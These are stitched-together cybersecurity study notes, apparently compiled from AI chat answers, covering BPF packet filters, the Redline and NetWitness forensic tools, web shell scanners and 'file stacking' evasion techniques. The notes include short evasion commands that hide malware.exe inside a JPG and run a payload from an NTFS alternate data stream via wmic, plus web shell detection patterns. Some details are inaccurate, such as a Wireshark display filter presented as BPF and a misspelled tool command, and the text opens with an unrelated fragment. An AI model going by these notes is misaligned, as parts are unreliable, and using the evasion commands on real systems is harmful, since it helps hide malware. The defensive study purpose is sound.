**Note:** SCM is now deprecated (last update: Windows 10 1809), but baselines are still available via [Microsoft's Security Guidance](https://aka.ms/secguides).  



---
### **Berkeley Packet Filter (BPF) Language**  

**Berkeley Packet Filter (BPF)** is a low-level **filtering language** used to analyze and capture network traffic. It allows efficient filtering of packets in kernel space, minimizing data copying between kernel and user space.  

---

## **1. What is BPF?**  
- Originally developed for **tcpdump** and **libpcap**.  
- Now used in modern tools like **Wireshark**, **eBPF (Extended BPF)** for Linux, and **Windows Filtering Platform (WFP)**.  
- Operates at **Layer 2 (Ethernet) to Layer 4 (TCP/UDP)**.  

---

## **2. BPF Syntax Basics**  
BPF filters packets using **expressions** that match:  
- **Protocols** (`tcp`, `udp`, `icmp`).  
- **Source/Dest IPs** (`host`, `src`, `dst`).  
- **Ports** (`port`, `src port`, `dst port`).  
- **Packet contents** (`payload` matching).  

### **Common BPF Filters**  
| Filter | Description |
|--------|-------------|
| `tcp` | Capture only TCP packets |
| `udp port 53` | DNS traffic (UDP port 53) |
| `host 192.168.1.1` | Traffic to/from `192.168.1.1` |
| `src net 10.0.0.0/24` | Packets from `10.0.0.0/24` subnet |
| `icmp and not (host 8.8.8.8)` | ICMP traffic excluding Google DNS |

---

## **3. BPF in Security & Networking**  
### **Use Cases**  
✔ **Packet Capture (tcpdump, Wireshark)**  
   ```sh
   tcpdump -i eth0 'tcp port 80 and host 10.0.0.5'
   ```
✔ **Intrusion Detection (IDS/IPS)** – Filter malicious traffic patterns.  
✔ **Network Monitoring** – Detect anomalies (e.g., port scans).  
✔ **eBPF (Linux)** – Advanced filtering for security (e.g., blocking malicious syscalls).  

### **Security Example: Detecting SYN Scans**  
```sh
tcpdump -i eth0 'tcp[13] & 2 != 0 and not dst net 192.168.1.0/24'
```
- `tcp[13] & 2 != 0` → TCP SYN flag set.  
- `not dst net 192.168.1.0/24` → Excludes internal traffic.  

---

## **4. BPF vs. eBPF (Extended BPF)**  
| Feature | **Classic BPF** | **eBPF (Linux)** |
|---------|----------------|------------------|
| **Scope** | Packet filtering | Packet filtering + syscall tracing, security policies |
| **Complexity** | Simple (tcpdump) | Advanced (kernel-level programs) |
| **Performance** | Fast (kernel filtering) | Faster (JIT-compiled) |
| **Tools** | tcpdump, Wireshark | Cilium, Falco, BPFtrace |

---

## **5. Limitations**  
- **No Deep Packet Inspection (DPI)** – Only headers (L2-L4).  
- **Limited Logic** – Cannot parse HTTP/SSL payloads directly.  

---

## **6. Tools Using BPF**  
- **tcpdump** (`tcpdump -i eth0 'icmp'`)  
- **Wireshark** (BPF filter: `ip.addr == 1.1.1.1`)  
- **Suricata** (IDS/IPS rules)  
- **eBPF-based** tools:  
  - **Cilium** (Kubernetes security)  
  - **Falco** (Container runtime security)  




---
Here’s a concise breakdown of **Redline** and **RSA NetWitness Investigator**, two powerful tools for cybersecurity analysis:

---

### **1. Redline (by FireEye/Mandiant)**  
**Purpose:** Free endpoint forensic tool for **memory analysis, IOC scanning, and threat hunting**.  

#### **Key Features:**  
✔ **Memory Analysis** – Dumps and analyzes RAM for malware artifacts.  
✔ **IOC Scanning** – Detects known threats using Indicators of Compromise (IOCs).  
✔ **Process/Network Inspection** – Maps suspicious process trees and connections.  
✔ **Timeline Analysis** – Reviews file/registry changes for attacker activity.  

#### **Use Cases:**  
- Investigate **ransomware infections**.  
- Hunt for **fileless malware** (e.g., PowerShell attacks).  
- Validate **EDR alerts** with deeper forensics.  

#### **Command Example:**  
```powershell
Redline.exe /audit /now /target <IP_or_Hostname>
```

---

### **2. RSA NetWitness Investigator**  
**Purpose:** Network forensic tool for **packet analysis, log correlation, and threat detection**.  

#### **Key Features:**  
✔ **Packet Capture Analysis** – Decodes protocols (HTTP, DNS, SMB).  
✔ **Log Correlation** – Links network events with endpoint/SIEM data.  
✔ **Threat Intelligence** – Flags C2 traffic, exploits, and anomalies.  
✔ **Custom Queries** – Uses RSA’s **Query Language (RSA-QL)** for advanced searches.  

#### **Use Cases:**  
- Investigate **phishing campaigns** (malicious URLs/attachments).  
- Detect **lateral movement** (e.g., PsExec, RDP brute-forcing).  
- Analyze **data exfiltration** (unusual outbound traffic).  

#### **Query Example:**  
```sql
service=80 && method=POST && useragent contains 'Mozilla'
```

---

### **Comparison Table**  
| Tool               | **Focus**          | **Data Source**          | **Best For**                               |
| ------------------ | ------------------ | ------------------------ | ------------------------------------------ |
| **Redline**        | Endpoint forensics | Memory, processes, files | Malware analysis, incident response        |
| **RSA NetWitness** | Network forensics  | Packets, logs, NetFlow   | Network threat detection, SIEM integration |

---

Here’s a concise breakdown of **web shell discovery tools**, their capabilities, and use cases:

---

### **1. Loki - Simple IOC Scanner**  
**Purpose:** Detects known web shells, malware, and IOCs (Indicators of Compromise).  
**Features:**  
✔ Scans files, processes, and memory for known malicious patterns.  
✔ Uses YARA rules for signature-based detection.  
✔ Checks for suspicious PHP/ASPX files.  
**Command:**  
```bash
python loki.py -p /var/www/html
```
**Best For:** Quick scans for **known web shells** (e.g., `c99`, `r57`).  

---

### **2. NeoPI**  
**Purpose:** Statistical analysis to find obfuscated web shells.  
**Features:**  
✔ Entropy analysis (detects high randomness in code).  
✔ Checks for **long strings, compression, and encoding**.  
✔ Works with PHP, ASP, JSP.  
**Command:**  
```bash
python neopi.py -a /var/www
```
**Best For:** Finding **obfuscated or custom web shells** missed by signature tools.  

---

### **3. BackdoorMan**  
**Purpose:** Hunts for backdoors in web applications.  
**Features:**  
✔ Searches for **suspicious functions** (`eval`, `system`, `base64_decode`).  
✔ Detects **hidden parameters** (e.g., `?cmd=whoami`).  
**Command:**  
```bash
python backdoorman.py -u http://example.com
```
**Best For:** Identifying **stealthy backdoors** in live web apps.  

---

### **4. PHP Malware Finder (PMF)**  
**Purpose:** Focused on detecting PHP-based web shells.  
**Features:**  
✔ Uses **YARA rules** for PHP malware patterns.  
✔ Detects obfuscated code (e.g., `gzinflate(base64_decode(...))`).  
**Command:**  
```bash
php pmf.php -f /var/www
```
**Best For:** **PHP-specific** web shells (e.g., `WebShell`, `b374k`).  

---

### **5. NPROCWATCH**  
**Purpose:** Monitors **new processes** for suspicious activity.  
**Features:**  
✔ Alerts on unexpected process spawns (e.g., `wget` or `curl` from web servers).  
✔ Can detect **web shell-triggered commands**.  
**Command:**  
```bash
nprotwatch --alert --exclude "apache,nginx"
```
**Best For:** Real-time detection of **web shell executions**.  

---

### **Comparison Table**  
| Tool | **Detection Method** | **Language Focus** | **Best For** |  
|------|----------------------|--------------------|--------------|  
| **Loki** | Signature-based (YARA) | Multi-language | Known IOCs |  
| **NeoPI** | Entropy/statistical | PHP/ASP/JSP | Obfuscated shells |  
| **BackdoorMan** | Function/parameter analysis | Live web apps | Hidden backdoors |  
| **PHP Malware Finder** | YARA rules | PHP-only | PHP obfuscation |  
| **NPROCWATCH** | Process monitoring | Any | Post-exploitation activity |  

---

### **File Stacking Techniques in Cybersecurity**  

File stacking refers to methods used to **hide malicious files** by combining or manipulating them in ways that evade detection. Attackers use these techniques to **bypass antivirus, EDR, and forensic analysis**. Below are common file stacking techniques and how they work:  

---

## **1. File Concatenation (Simple Appending)**
**How it Works:**  
- A malicious file (e.g., `.exe`) is **appended to a legitimate file** (e.g., `.jpg`).  
- When executed, the malicious payload extracts and runs.  

**Example:**  
```bash
copy /b innocent.jpg + malware.exe output.jpg
```
- Appears as a `.jpg` but contains an `.exe`.  

**Detection:**  
✔ File entropy analysis (high entropy indicates appended data).  
✔ Check file headers (`file` command, `hexdump`).  

---

## **2. Alternate Data Streams (ADS) (NTFS Feature)**
**How it Works:**  
- Stores hidden data in **NTFS alternate streams** (invisible in Explorer).  
- Malware hides in `file.txt:malware.exe`.  

**Example:**  
```cmd
echo malicious code > legit.txt:evil.exe
wmic process call create "C:\legit.txt:evil.exe"
```
**Detection:**  
✔ `dir /R` (Windows) or `streams.exe` (Sysinternals).  
✔ EDR tools monitor ADS creation.  

---

## **3. Steganography (Data Hiding in Media)**
**How it Works:**  
- Embeds malware inside **images, audio, or PDFs** using LSB (Least Significant Bit) insertion.  
- Example: `malware.exe` hidden inside `cat.png`.  

**Detection:**  
✔ **Stegdetect** (checks for steganography).  
✔ **Entropy analysis** (unnatural pixel/bit patterns).  

---

## **4. Polyglot Files (Multiple Valid File Types)**
**How it Works:**  
- A single file is **valid in multiple formats** (e.g., a file that is both a `.pdf` and `.zip`).  
- Bypasses file type checks.  

**Example:**  
- A **PDF+ZIP polyglot** that extracts malware when unzipped.  

**Detection:**  
✔ **File signature analysis** (`binwalk`, `TrID`).  
✔ **Content inspection** (unexpected data in headers).  

---

## **5. File Wrapping (Embedding in Containers)**
**How it Works:**  
- Malware is **embedded in ISO, CAB, or RAR files** to evade scanning.  
- Example: `invoice.iso` containing `malware.exe`.  

**Detection:**  
✔ **Static analysis** (unpack with `7z`, `binwalk`).  
✔ **Behavioral monitoring** (unexpected ISO mounts).  

---

## **6. DLL Side-Loading (Legitimate Binary Abuse)**
**How it Works:**  
- Replaces a legitimate DLL (e.g., `version.dll`) with a malicious one.  
- A trusted executable loads the malicious DLL.  

**Detection:**  
✔ **DLL hash verification** (`sigcheck`).  
✔ **Process Monitor** (`ProcMon`) for unusual DLL loads.  

---

## **7. Process Hollowing (Legit Process Replacement)**
**How it Works:**  
- Creates a **suspended legitimate process** (e.g., `svchost.exe`).  
- Replaces its memory with malicious code.  

**Detection:**  
✔ **EDR monitoring** (unusual process memory changes).  
✔ **Sysmon Event ID 10** (process access).  

---

## **Comparison of File Stacking Techniques**  
| Technique             | **Evasion Method**        | **Detection Approach**         |
| --------------------- | ------------------------- | ------------------------------ |
| **Concatenation**     | Appends malware to files  | Entropy analysis, file headers |
| **ADS**               | Hides in NTFS streams     | `dir /R`, EDR monitoring       |
| **Steganography**     | Embeds in media files     | Stegdetect, entropy checks     |
| **Polyglot Files**    | Valid in multiple formats | File signature analysis        |
| **File Wrapping**     | Uses containers (ISO/RAR) | Unpack and scan                |
| **DLL Side-Loading**  | Abuse trusted binaries    | DLL integrity checks           |
| **Process Hollowing** | Replaces process memory   | Memory forensics               |

---

## **How to Defend Against File Stacking?**  
1. **Use Advanced EDR/XDR** (detects anomalous file behavior).  
2. **Enable File Integrity Monitoring (FIM)**.  
3. **Analyze File Entropy** (high entropy = possible obfuscation).  
4. **Restrict Script Execution** (block `.js`, `.hta`, `.ps1` from email).  
5. **Monitor Process Hollowing** (Sysmon + EDR).  

---
